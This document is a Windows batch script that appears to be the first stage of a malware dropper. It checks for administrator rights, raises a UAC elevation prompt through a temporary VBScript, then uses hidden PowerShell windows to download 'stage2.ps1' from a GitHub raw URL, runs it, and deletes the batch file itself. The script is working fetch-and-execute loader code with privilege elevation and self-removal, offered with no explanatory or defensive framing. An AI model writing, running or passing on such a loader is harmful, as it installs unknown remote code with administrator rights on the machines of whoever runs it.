
@REM ADMIN RIGHTS
@echo off
set "encodage_cible=UTF-8"
set "pJhgt=%~dp0"


:: Verification of privileges admins
whoami /groups | find "S-1-16-12288" >nul
if not errorlevel 1 (
    echo Already Admin.
    goto gotAdmin
)

:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "AMD64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    
    "%temp%\getadmin.vbs"
    
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    
    pushd "%CD%"
    CD /D "%~dp0"
    
    powershell -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/flamendO/TOBASHI/main/files/stage2.ps1 -OutFile stage2.ps1
    powershell -windowstyle hidden ./stage2.ps1
    del stage1.cmd

    
    

